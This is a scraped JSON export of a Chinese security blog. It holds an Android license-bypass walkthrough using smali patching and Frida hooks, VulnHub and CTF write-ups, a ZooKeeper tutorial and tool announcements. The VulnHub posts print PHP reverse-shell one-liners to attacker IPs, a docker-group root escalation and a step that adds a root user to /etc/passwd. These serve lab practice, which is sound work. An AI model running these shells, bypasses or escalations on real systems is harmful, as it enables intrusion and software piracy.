Ljava&#x2F;lang&#x2F;String; invoke-direct &#123;p0&#125;, Lde&#x2F;fraunhofer&#x2F;sit&#x2F;premiumapp&#x2F;LauncherActivity;-&gt;getMac()Ljava&#x2F;lang&#x2F;String; move-result-object v12 invoke-virtual &#123;v12&#125;, Ljava&#x2F;lang&#x2F;String;-&gt;getBytes()[B move-result-object v12 invoke-virtual &#123;v8&#125;, Ljava&#x2F;lang&#x2F;String;-&gt;getBytes()[B move-result-object v13 invoke-static &#123;v12, v13&#125;, Lde&#x2F;fraunhofer&#x2F;sit&#x2F;premiumapp&#x2F;MainActivity;-&gt;xor([B[B)[B move-result-object v12 invoke-direct &#123;v0, v12&#125;, Ljava&#x2F;lang&#x2F;String;-&gt;&lt;init&gt;([B)V .line 44 .local v0, &quot;activatedKey&quot;:Ljava&#x2F;lang&#x2F;String; invoke-virtual &#123;p0&#125;, Lde&#x2F;fraunhofer&#x2F;sit&#x2F;premiumapp&#x2F;LauncherActivity;-&gt;getApplicationContext()Landroid&#x2F;content&#x2F;Context; move-result-object v12 const-string v13, &quot;preferences&quot; const&#x2F;4 v14, 0x0 invoke-virtual &#123;v12, v13, v14&#125;, Landroid&#x2F;content&#x2F;Context;-&gt;getSharedPreferences(Ljava&#x2F;lang&#x2F;String;I)Landroid&#x2F;content&#x2F;SharedPreferences; move-result-object v7 .line 45 .local v7, &quot;pref&quot;:Landroid&#x2F;content&#x2F;SharedPreferences; invoke-interface &#123;v7&#125;, Landroid&#x2F;content&#x2F;SharedPreferences;-&gt;edit()Landroid&#x2F;content&#x2F;SharedPreferences$Editor; move-result-object v4 .line 46 .local v4, &quot;editor&quot;:Landroid&#x2F;content&#x2F;SharedPreferences$Editor; const-string v12, &quot;KEY&quot; invoke-interface &#123;v4, v12, v0&#125;, Landroid&#x2F;content&#x2F;SharedPreferences$Editor;-&gt;putString(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)Landroid&#x2F;content&#x2F;SharedPreferences$Editor; .line 47 invoke-interface &#123;v4&#125;, Landroid&#x2F;content&#x2F;SharedPreferences$Editor;-&gt;commit()Z .line 48 new-instance v12, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder; invoke-direct &#123;v12, p0&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid&#x2F;content&#x2F;Context;)V const-string v13, &quot;Activation successful&quot; .line 49 invoke-virtual &#123;v12, v13&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder;-&gt;setTitle(Ljava&#x2F;lang&#x2F;CharSequence;)Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder; move-result-object v12 const-string v13, &quot;Activation successful&quot; .line 50 invoke-virtual &#123;v12, v13&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder;-&gt;setMessage(Ljava&#x2F;lang&#x2F;CharSequence;)Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder; move-result-object v12 const v13, 0x1080027 .line 51 invoke-virtual &#123;v12, v13&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder;-&gt;setIcon(I)Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder; move-result-object v12 .line 52 invoke-virtual &#123;v12&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog$Builder;-&gt;show()Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AlertDialog; :cond_1 return-void .end method 修改如上，重新给v8寄存器赋值。并且删除以上全部请求代码，清楚其他try的代码，不然其做HTTP请求验证。完整的verifyClick函数smail代码如上。至此网络验证的给去掉了。 点击verify，就会显示验证成功，然后写入本地数据保存key值。 只不过这样修改，再点击premium的时候就是认证成功的了。 Hook 函数那么先hook一下getMac和getKey函数，看一下返回是什么值。 import frida, sys jscode &#x3D; &quot;&quot;&quot; Java.perform(function()&#123; var lunc &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;); lunc.getMac.implementation &#x3D; function()&#123; send(&quot;HOOK Start....&quot;); var sed &#x3D; this.getMac(); send(sed); var ser &#x3D; this.getKey(); send(ser); return sed; &#125; &#125;) &quot;&quot;&quot; def message(message, data): if message[&quot;type&quot;] &#x3D;&#x3D; &quot;send&quot;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;])) else: print(message) process &#x3D; frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;) script &#x3D; process.create_script(jscode) script.on(&quot;message&quot;, message) script.load() sys.stdin.read() 在手机上打开Frida。转发端口27042。运行后获取到两个参数，一个是WiFi的Mac，一个是key。 然后按照修改返回参数来直接达到不修改apk的目的。 Hook 直接获得结果从代码中就可以看到，当返回结果为LICENSEKEYOK时，调用MainActivity类下的xor方法。参数一个是上面的Mac的byte值，一个是LICENSEKEYOK的byte值。 import frida, sys jscode &#x3D; &quot;&quot;&quot; Java.perform(function()&#123; &#x2F;&#x2F;字符串转byte function stringToBytes(str) &#123; var ch, st, re &#x3D; []; for (var i &#x3D; 0; i &lt; str.length; i++ ) &#123; ch &#x3D; str.charCodeAt(i); &#x2F;&#x2F; get char st &#x3D; []; &#x2F;&#x2F; set up &quot;stack&quot; do &#123; st.push( ch &amp; 0xFF ); &#x2F;&#x2F; push byte to stack ch &#x3D; ch &gt;&gt; 8; &#x2F;&#x2F; shift value down by 1 byte &#125; while ( ch ); re &#x3D; re.concat( st.reverse() ); &#125; return re; &#125; &#x2F;&#x2F;byte转字符串 function byteToString(arr) &#123; if(typeof arr &#x3D;&#x3D;&#x3D; &#39;string&#39;) &#123; return arr; &#125; var str &#x3D; &#39;&#39;, _arr &#x3D; arr; for(var i &#x3D; 0; i &lt; _arr.length; i++) &#123; var one &#x3D; _arr[i].toString(2), v &#x3D; one.match(&#x2F;^1+?(?&#x3D;0)&#x2F;); if(v &amp;&amp; one.length &#x3D;&#x3D; 8) &#123; var bytesLength &#x3D; v[0].length; var store &#x3D; _arr[i].toString(2).slice(7 - bytesLength); for(var st &#x3D; 1; st &lt; bytesLength; st++) &#123; store +&#x3D; _arr[st + i].toString(2).slice(2); &#125; str +&#x3D; String.fromCharCode(parseInt(store, 2)); i +&#x3D; bytesLength - 1; &#125; else &#123; str +&#x3D; String.fromCharCode(_arr[i]); &#125; &#125; return str; &#125; var lunc &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;); var main &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;); lunc.getKey.implementation &#x3D; function()&#123; send(&quot;HOOK Start....&quot;); var sed &#x3D; this.getMac(); send(sed); &#x2F;&#x2F;获取mac var xor &#x3D; main.xor(stringToBytes(sed), stringToBytes(&quot;LICENSEKEYOK&quot;)); &#x2F;&#x2F;生成key var ser &#x3D; byteToString(xor); send(ser); return ser; &#125; &#125;) &quot;&quot;&quot; def message(message, data): if message[&quot;type&quot;] &#x3D;&#x3D; &quot;send&quot;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;])) else: print(message) process &#x3D; frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;) script &#x3D; process.create_script(jscode) script.on(&quot;message&quot;, message) script.load() sys.stdin.read() 执行如上代码，即可Hook到key函数，然后由xor生成，来返回给getKey函数。返回如下所示。","categories":[],"tags":[]},{"title":"Linux主机安全检查脚本","slug":"Linux主机安全检查脚本","date":"2019-11-22T07:36:57.000Z","updated":"2019-11-22T07:42:57.000Z","comments":true,"path":"2019/11/Linux主机安全检查脚本/","link":"","permalink":"https://misakikata.github.io/2019/11/Linux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/","excerpt":"","text":"检查项0.检测命令是否被修改 1.获取网络连接 2.查看对外开放端口 3.查看是否存在高危端口 4.查看启动项 5.查看定时任务 6.查看调度任务 7.检测cpu异常进程 8.检测特权用户 9.查看登陆用户 10.可登录用户 11.最近修改过的文件 12.查看是否存在可疑命令 13.root是否允许远程登陆 14.检查是否存在可疑脚本 15.日志文件打包 16.查看登陆到主机的用户 17.检查磁盘使用量 以上检查项按照比较关心的项来写，在Ubuntu主机上测试，个别命令可能centos不带，需要提前安装。 地址项目地址：https://github.com/MisakiKata/Linuxcheck 参考其中还包括一批后门端口，利用来自：port列表","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"https://misakikata.github.io/tags/shell/"}]},{"title":"vulnhub Chakravyuh","slug":"vulnhub-Chakravyuh","date":"2019-11-15T07:15:22.000Z","updated":"2019-11-25T09:30:06.000Z","comments":true,"path":"2019/11/vulnhub-Chakravyuh/","link":"","permalink":"https://misakikata.github.io/2019/11/vulnhub-Chakravyuh/","excerpt":"","text":"修改网络连接方式为DHCP 按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138 信息发现按照惯例，首先把主机开放端口扫描，发现开放端口为80、22、65530。其中65530是一个ftp服务，连接发现无密码，文件夹pub下存在一个arjun.7z的压缩包。 访问80端口，就一张图片，扫描路径，发现phpmyadmin。无空密码。 爆破压缩包到此，需要一个能登陆phpmyadmin的账号密码。尝试爆破7z压缩包。利用一个小脚本爆破。 根据脚本的建议，需要一份字典，rockyou or crackstation。是kali上的字典，但是手头没有kali。直接搜索下载。 https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt 爆破是贼慢，但是密码成功出来了，是family。打开是一个secret.txt文件，里面有一个类似base64加密的字符串。 字符串为以下，看起来是账号：邮箱：密码。不过遗憾的是，并不能登陆phpmyadmin。那这个字符串就可能是字段：账号：密码的形式。 Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E&#x3D; 解码为： gila:admin@gmail.com:princesa 利用已知漏洞后来试一下路径，发现存在这个一个地址，gila是一个cms。 http:&#x2F;&#x2F;192.168.120.138&#x2F;gila&#x2F; 到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。 http:&#x2F;&#x2F;192.168.120.138&#x2F;gila&#x2F;admin 登陆后，看到版本为1.10.9。基本可以确定是一个后台获取webshell的利用方式，搜索谷歌，查找一下是否有已知的漏洞。在exploit-db上找到了一个本地文件包含漏洞。尝试确实存在，而已可以上传文件。查看一下发现是content下的文件管理功能。 http:&#x2F;&#x2F;192.168.120.138&#x2F;gila&#x2F;admin&#x2F;fm?f&#x3D;.&#x2F;.. 利用上传文件创建新文件后门。在assert文件夹下，但是php文件不能访问，需要修改.htaccess文件。 修改为Allow from all，即可访问上传的文件。 反弹shell获取权限利用php反弹shell php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.30.79&quot;,8080);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; #升级shell python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考 https://www.freebuf.com/articles/system/170783.html 借助一个docker镜像，查看本机存在一个alpine镜像 采用-v的目录映射，此处修改为/root:/root，运行进入docker内部 docker run -it --rm -v &#x2F;root:&#x2F;root alpine 找到root下的文件，打开即可","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"ZooKeeper","slug":"ZooKeeper","date":"2019-11-15T07:11:39.000Z","updated":"2019-11-15T08:08:28.000Z","comments":true,"path":"2019/11/ZooKeeper/","link":"","permalink":"https://misakikata.github.io/2019/11/ZooKeeper/","excerpt":"","text":"什么是Apache ZooKeeper？Apache ZooKeeper是由集群（节点组）使用的一种服务，用于在自身之间协调，并通过稳健的同步技术维护共享数据。ZooKeeper本身是一个分布式应用程序，为写入分布式应用程序提供服务。 ZooKeeper提供的常见服务如下 : 命名服务 - 按名称标识集群中的节点。它类似于DNS，但仅对于节点。 配置管理 - 加入节点的最近的和最新的系统配置信息。 集群管理 - 实时地在集群和节点状态中加入/离开节点。 选举算法 - 选举一个节点作为协调目的的leader。 锁定和同步服务 - 在修改数据的同时锁定数据。此机制可帮助你在连接其他分布式应用程序（如Apache HBase）时进行自动故障恢复。 高度可靠的数据注册表 - 即使在一个或几个节点关闭时也可以获得数据。 分布式应用程序提供了很多好处，但它们也抛出了一些复杂和难以解决的挑战。ZooKeeper框架提供了一个完整的机制来克服所有的挑战。竞争条件和死锁使用故障安全同步方法进行处理。另一个主要缺点是数据的不一致性，ZooKeeper使用原子性解析。 ZooKeeper的好处以下是使用ZooKeeper的好处： 简单的分布式协调过程 同步 - 服务器进程之间的相互排斥和协作。此过程有助于Apache HBase进行配置管理。 有序的消息 序列化 - 根据特定规则对数据进行编码。确保应用程序运行一致。这种方法可以在MapReduce中用来协调队列以执行运行的线程。 可靠性 原子性 - 数据转移完全成功或完全失败，但没有事务是部分的。 Java环境最新版zookeeper需要Java1.8.211以上。 比如利用源安装 yum install java-1.8.0-openjdk.x86_64 java -version openjdk version &quot;1.8.0_232&quot; ZooKeeper地址：https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.6/apache-zookeeper-3.5.6-bin.tar.gz 解压缩，进入conf目录修改zoo-sample.cfg文件为zoo.cfg文件。 打开文件，修改路径，类似如下 # The number of milliseconds of each tick tickTime&#x3D;2000 # The number of ticks that the initial # synchronization phase can take initLimit&#x3D;10 # The number of ticks that can pass between # sending a request and getting an acknowledgement syncLimit&#x3D;5 # the directory where the snapshot is stored. # do not use &#x2F;tmp for storage, &#x2F;tmp here is just # example sakes. dataDir&#x3D;&#x2F;data&#x2F;zookeeper # the port at which the clients will connect clientPort&#x3D;2181 # the maximum number of client connections. # increase this if you need to handle more clients #maxClientCnxns&#x3D;60 # # Be sure to read the maintenance section of the # administrator guide before turning on autopurge. # # http:&#x2F;&#x2F;zookeeper.apache.org&#x2F;doc&#x2F;current&#x2F;zookeeperAdmin.html#sc_maintenance # # The number of snapshots to retain in dataDir #autopurge.snapRetainCount&#x3D;3 # Purge task interval in hours # Set to &quot;0&quot; to disable auto purge feature #autopurge.purgeInterval&#x3D;1 保存，到bin目录下执行 [root@VM_0_6_centos bin]# .&#x2F;zkServer.sh start &#x2F;usr&#x2F;bin&#x2F;java ZooKeeper JMX enabled by default Using config: &#x2F;root&#x2F;apache-zookeeper-3.5.6-bin&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg Starting zookeeper ... STARTED 开始服务后，启动cli端。 [root@VM_0_6_centos bin]# .&#x2F;zkCli.sh &#x2F;usr&#x2F;bin&#x2F;java Connecting to localhost:2181 创建Znode节点create &#x2F;path &#x2F;data eg: [zk: localhost:2181(CONNECTED) 4] create &#x2F;datapp zookapp Created &#x2F;datapp 创建顺序节点create -e &#x2F;path &#x2F;data eg: [zk: localhost:2181(CONNECTED) 5] create -s &#x2F;datapp zookapp Created &#x2F;datapp0000000003 删除节点[zk: localhost:2181(CONNECTED) 6] delete &#x2F;datapp [zk: localhost:2181(CONNECTED) 7] ls &#x2F;datapp Node does not exist: &#x2F;datapp #删除带子节点的节点 [zk: localhost:2181(CONNECTED) 30] ls &#x2F;datapp [sec] [zk: localhost:2181(CONNECTED) 33] deleteall &#x2F;datapp [zk: localhost:2181(CONNECTED) 34] 获取数据[zk: localhost:2181(CONNECTED) 11] get &#x2F;datapp zookapp [zk: localhost:2181(CONNECTED) 13] get -s &#x2F;datapp #查看全部数据 zookapp cZxid &#x3D; 0xc ctime &#x3D; Thu Nov 07 11:10:41 CST 2019 mZxid &#x3D; 0xc mtime &#x3D; Thu Nov 07 11:10:41 CST 2019 pZxid &#x3D; 0xc cversion &#x3D; 0 dataVersion &#x3D; 0 aclVersion &#x3D; 0 ephemeralOwner &#x3D; 0x0 dataLength &#x3D; 7 numChildren &#x3D; 0 [zk: localhost:2181(CONNECTED) 18] set &#x2F;datapp zookupdate #设置更改 WATCHER:: WatchedEvent state:SyncConnected type:NodeDataChanged path:&#x2F;datapp [zk: localhost:2181(CONNECTED) 19] get -w &#x2F;datapp #查看更改 zookupdate [zk: localhost:2181(CONNECTED) 20] set &#x2F;datapp cversion&#x3D;1 WATCHER:: WatchedEvent state:SyncConnected type:NodeDataChanged path:&#x2F;datapp [zk: localhost:2181(CONNECTED) 21] get -w &#x2F;datapp cversion&#x3D;1 设置数据[zk: localhost:2181(CONNECTED) 18] set &#x2F;datapp zookupdate WATCHER:: WatchedEvent state:SyncConnected type:NodeDataChanged path:&#x2F;datapp [zk: localhost:2181(CONNECTED) 19] get -w &#x2F;datapp zookupdate 创建子节点[zk: localhost:2181(CONNECTED) 28] create &#x2F;datapp zookapp Created &#x2F;datapp [zk: localhost:2181(CONNECTED) 29] create &#x2F;datapp&#x2F;sec zookapp2 Created &#x2F;datapp&#x2F;sec [zk: localhost:2181(CONNECTED) 30] ls &#x2F;datapp [sec] [zk: localhost:2181(CONNECTED) 31] get &#x2F;datapp zookapp [zk: localhost:2181(CONNECTED) 32] get &#x2F;datapp&#x2F;sec zookapp2 Zookeeper集群部署此处利用一台主机模拟两个zookeeper部署，在root目录下创建两个文件夹， 一个为zookeeper1，一个为zookeeper2。而实际环境中最小需要三个节点，最好是奇数节点。 创建data目录，在conf配置文件中修改如下，端口由于是在一台主机上，所以需要不同的端口，正常形式下，可以设置为不同IP同端口。 # The number of milliseconds of each tick tickTime&#x3D;2000 # The number of ticks that the initial # synchronization phase can take initLimit&#x3D;10 # The number of ticks that can pass between # sending a request and getting an acknowledgement syncLimit&#x3D;5 # the directory where the snapshot is stored. # do not use &#x2F;tmp for storage, &#x2F;tmp here is just # example sakes. dataDir&#x3D;&#x2F;data&#x2F;zookeeper1 # the port at which the clients will connect clientPort&#x3D;2181 # the maximum number of client connections. # increase this if you need to handle more clients #maxClientCnxns&#x3D;60 # # Be sure to read the maintenance section of the # administrator guide before turning on autopurge. # # http:&#x2F;&#x2F;zookeeper.apache.org&#x2F;doc&#x2F;current&#x2F;zookeeperAdmin.html#sc_maintenance # # The number of snapshots to retain in dataDir #autopurge.snapRetainCount&#x3D;3 # Purge task interval in hours # Set to &quot;0&quot; to disable auto purge feature #autopurge.purgeInterval&#x3D;1 server.1&#x3D;127.0.0.1:7788:8890 server.2&#x3D;127.0.0.1:7789:8891 创建data/myid文件创建文件myid，写入配置文件中的server名。文件的存在位置跟配置文件中的dataDir一致。 [root@VM_0_6_centos zookeeper1]# echo &quot;1&quot; &gt; myid [root@VM_0_6_centos zookeeper1]# ls myid 分别启动后查看状态可以发现，已经选举了一个为leader [root@VM_0_6_centos zookeeper2]# .&#x2F;bin&#x2F;zkServer.sh status &#x2F;usr&#x2F;bin&#x2F;java ZooKeeper JMX enabled by default Using config: &#x2F;root&#x2F;zookeeper2&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg Client port found: 2182. Client address: localhost. Mode: leader [root@VM_0_6_centos zookeeper1]# .&#x2F;bin&#x2F;zkServer.sh status &#x2F;usr&#x2F;bin&#x2F;java ZooKeeper JMX enabled by default Using config: &#x2F;root&#x2F;zookeeper1&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg Client port found: 2181. Client address: localhost. Mode: follower 在leader端修改数据，新建znode节点 [zk: localhost:2181(CONNECTED) 0] create &#x2F;datapp idsign Created &#x2F;datapp [zk: localhost:2181(CONNECTED) 1] follow端 [zk: localhost:2181(CONNECTED) 0] get &#x2F;datapp idsign [zk: localhost:2181(CONNECTED) 1] follow端修改数据，leader端同步到数据，向其他follow写入数据 [zk: localhost:2181(CONNECTED) 1] set &#x2F;datapp idsign&#x3D;xxxx [zk: localhost:2181(CONNECTED) 0] get &#x2F;datapp idsign&#x3D;xxxx [zk: localhost:2181(CONNECTED) 1] ZooKeeper API官方提供了绑定Java和C的API，此处不做使用解释。以下以python的API使用为例。 Java版文档：http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/ZooKeeper.html Java示例：https://blog.csdn.net/u013468915/article/details/80878490 python版文档：https://kazoo.readthedocs.io/en/latest/install.html pip install kazoo #安装kazoo 连接到ZooKeeper from kazoo.client import KazooClient zk &#x3D; KazooClient(hosts&#x3D;&#39;106.54.181.187:2181&#39;) #连接 zk.start() 节点状态 from kazoo.client import KazooState def my_listener(state): if state &#x3D;&#x3D; KazooState.LOST: print(&#39;ZooKeeper Lost&#39;) # 状态为丢失时 elif state &#x3D;&#x3D; KazooState.SUSPENDED: print(&#39;ZooKeeper Suspended&#39;) # 状态为暂停 else: print(&#39;ZooKeeper Connect&#39;) # 状态为连接中 zk.add_listener(my_listener) Zookeeper 3.4及更高版本支持只读模式。 必须为Zookeeper集群中的服务器打开此模式，客户端才能使用它。 要将这种模式与Kazoo一起使用，应在read_only选项设置为True的情况下调用KazooClient。 这将使客户端连接到已变为只读的Zookeeper节点，并且客户端将继续扫描其他可读写的节点。 from kazoo.client import KazooClient from kazoo.client import KazooState from kazoo.client import KeeperState zk &#x3D; KazooClient(hosts&#x3D;&#39;127.0.0.1:2181&#39;, read_only&#x3D;True) zk.start() @zk.add_listener def watch_for_ro(state): if state &#x3D;&#x3D; KazooState.CONNECTED: if zk.client_state &#x3D;&#x3D; KeeperState.CONNECTED_RO: print(&quot;Read only mode!&quot;) else: print(&quot;Read&#x2F;Write mode!&quot;) 创建节点，使用的方法有ensure_path()和create() # 确定路径，在必要时创建 zk.ensure_path(&quot;&#x2F;my&#x2F;favorite&quot;) # 用数据创建一个节点 zk.create(&quot;&#x2F;my&#x2F;favorite&#x2F;node&quot;, b&quot;a value&quot;) 读取节点信息 exists() 检查节点是否存在。 get() 在ZnodeStat结构中获取节点的数据以及详细的节点信息。 get_children() 获取给定节点的子级列表 eg: if zk.exists(&quot;&#x2F;my&#x2F;favorite&quot;): #判断&#x2F;my&#x2F;favorite是否存在 data, stat &#x3D; zk.get(&quot;&#x2F;my&#x2F;favorite&quot;) #查看节点信息 print(&quot;Version: %s, data: %s&quot; % (stat.version, data.decode(&quot;utf-8&quot;))) children &#x3D; zk.get_children(&quot;&#x2F;my&#x2F;favorite&quot;) #查看节点的子节点信息 print(&quot;There are %s children with names %s&quot; % (len(children), children)) 更新节点信息 zk.set(&quot;&#x2F;my&#x2F;favorite&quot;, b&quot;some data&quot;) 删除节点信息 zk.delete(&quot;&#x2F;my&#x2F;favorite&#x2F;node&quot;, recursive&#x3D;True) 重试命令 result &#x3D; zk.retry(zk.get, &quot;&#x2F;path&#x2F;to&#x2F;node&quot;) 相当于执行 zk.get(&#39;&#x2F;path&#x2F;to&#x2F;node&#39;) 利用如上信息，编写操作ZooKeeper的Python脚本 #coding:utf-8 from kazoo.client import KazooClient class zoocon: def __init__(self): self.zk &#x3D; KazooClient(hosts&#x3D;&#39;106.54.181.187:2181&#39;) #连接 self.zk.start() self.path &#x3D; &#39;&#x2F;datapp&#39; def get_data(self): res &#x3D; self.zk.get(self.path) print(res) def exist(self): self.zk.exists(self.path) return True def create_data(self): self.zk.create(self.path, b&#39;signapp&#39;) def close(self): self.zk.close() def delete(self): self.zk.delete(self.path, recursive&#x3D;True) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: zks &#x3D; zoocon() if zks.exist(): zks.delete() zks.close() print &#39;path delete&#39; else: zks.create_data() zks.get_data() zks.close() 服务端存在datapp节点，运行后删除节点，当在服务器查看时，显示如下 [zk: localhost:2181(CONNECTED) 0] get &#x2F;datapp org.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode &#x3D; NoNode for &#x2F;datapp","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"VulnHub AI WEB 1.0","slug":"AI-WEB 1.0","date":"2019-11-06T08:39:05.000Z","updated":"2019-11-25T09:29:51.000Z","comments":true,"path":"2019/11/AI-WEB 1.0/","link":"","permalink":"https://misakikata.github.io/2019/11/AI-WEB%201.0/","excerpt":"","text":"加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。 扫描端口发现只有80的对外开放端口，访问发现 ![1572682029896](/2019/11/AI-WEB 1.0/1572682029896.png) 扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。 ![1572682020738](/2019/11/AI-WEB 1.0/1572682020738.png) 访问其中地址，403 ![1572682335561](/2019/11/AI-WEB 1.0/1572682335561.png) 介于是403尝试访问上一级发现 ![1572682385016](/2019/11/AI-WEB 1.0/1572682385016.png) 尝试输入1，发现显示admin用户，那就是说可能这是个注入点。 ![1572682438951](/2019/11/AI-WEB 1.0/1572682438951.png) 检查是否存在注入，发现存在 ![1572683771039](/2019/11/AI-WEB 1.0/1572683771039.png) 查询systemUser库发现三个用户 ![1572688569479](/2019/11/AI-WEB 1.0/1572688569479.png) t00r | FakeUserPassw0rd aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa u3er | N0tThis0neAls0 扫描路径m3diNf0下的文件，发现如下地址。 http:&#x2F;&#x2F;192.168.111.132&#x2F;m3diNf0&#x2F;info.php 找到物理地址，利用sqlmap写shell ![1572705709726](/2019/11/AI-WEB 1.0/1572705709726.png) 把给的路径加上物理地址都试一圈，发现如下地址是可写的。 &#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;se3reTdir777&#x2F;uploads&#x2F; 利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接 http:&#x2F;&#x2F;192.168.111.132&#x2F;se3reTdir777&#x2F;uploads&#x2F;a.php 来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。 php -r &#39;$sock&#x3D;fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 获取shell后查看发现是较高版本的内核，理论上不是内核提权。 ![image-20191102234632541](/2019/11/AI-WEB 1.0/image-20191102234632541.png) 查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆 ![image-20191103002714448](/2019/11/AI-WEB 1.0/image-20191103002714448.png) 但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。 后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。 ![image-20191103012733428](/2019/11/AI-WEB 1.0/image-20191103012733428.png) 这么说我这个账号还是多余的用来。 利用perl来生成加密的密码，账号密码admin perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39; &#x2F;&#x2F;12wGaKkN1hGuw admin:12wGaKkN1hGuw:0:0:User_like_root:&#x2F;root:&#x2F;bin&#x2F;bash 直接在蚁剑中追加一行 ![image-20191103013158615](/2019/11/AI-WEB 1.0/image-20191103013158615.png) sudo过来就已经是root权限 ![image-20191103013307387](/2019/11/AI-WEB 1.0/image-20191103013307387.png) 找到flag ![image-20191103013329582](/2019/11/AI-WEB 1.0/image-20191103013329582.png)","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"GitHub-Monitor","slug":"GitHub-Monitor","date":"2019-11-06T04:41:49.000Z","updated":"2019-11-06T04:41:49.000Z","comments":true,"path":"2019/11/GitHub-Monitor/","link":"","permalink":"https://misakikata.github.io/2019/11/GitHub-Monitor/","excerpt":"","text":"GITHUB_MONTIOR python3 + Django 2.2.6 + supervisord 环境由简单的Django完成，外加一个HTML展示模板 GitHub的爬虫由supervisord来维护，需要修改配置文件内的信息，可以改成/var/run路径 pip安装如下的文件即可 爬虫需要账号密码模拟登陆，进程为五分钟一次。是否扫描根据任务数据里保存的时间来做判断。 修改任务只需要在编辑里输入任务名，直接输入其他参数更新即可。 数据库采用MySQL5.7。 python3 manager.py createsuperuser python3 manager.py makemigrations python3 manager.py migrate 登陆后台添加一个可以登陆前端的账号即可。 地址：https://github.com/MisakiKata/github_monitor 首界面 全部信息 未处理信息 界面由于对js了解较少，没有采用比较nodejs类前端框架，当然也可以修改为自己喜欢的界面。 食用简单，望喜欢。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"2018SUSCTF-Mobile题","slug":"2018SUSCTF-Mobile题","date":"2019-10-23T08:29:20.000Z","updated":"2019-10-23T08:29:20.000Z","comments":true,"path":"2019/10/2018SUSCTF-Mobile题/","link":"","permalink":"https://misakikata.github.io/2019/10/2018SUSCTF-Mobile%E9%A2%98/","excerpt":"","text":"BabyAndroid常规，JEB反编译 根据输入的字符串长度，第一位和97异或，后面跟v0的字符异或，把结果字符串转入a函数中。a函数首先把给出的常量字符串转为数组，把传入的字符串转化为bytes数组，再根据数组长度把每一位做for中&amp;和左移计算，结果为3267347723651E492C1D7E117C1946325D02432D493B0B62067B则为真。所以逆推，由于一次计算拼接两位，所以按照两位为一个字符计算。其中含有字母，调试得知是对应的十六进制数。 #coding:utf-8 strs &#x3D; &quot;3267347723651E492C1D7E117C1946325D02432D493B0B62067B&quot; num &#x3D; [] for i in range(0, len(strs)): num.append(strs[i]) #52 nums &#x3D; [] id &#x3D; 0 while id &lt; 52: for i in range(0,200): if str((i &amp; 0xF0) &gt;&gt; 4) &#x3D;&#x3D; num[id]: if hex(i &amp; 15).replace(&#39;0x&#39;,&#39;&#39;).upper() &#x3D;&#x3D; num[id+1]: nums.append(i) break id &#x3D; id + 2 flag &#x3D; [] for i in range(0, len(nums)): if i &#x3D;&#x3D; 0: first 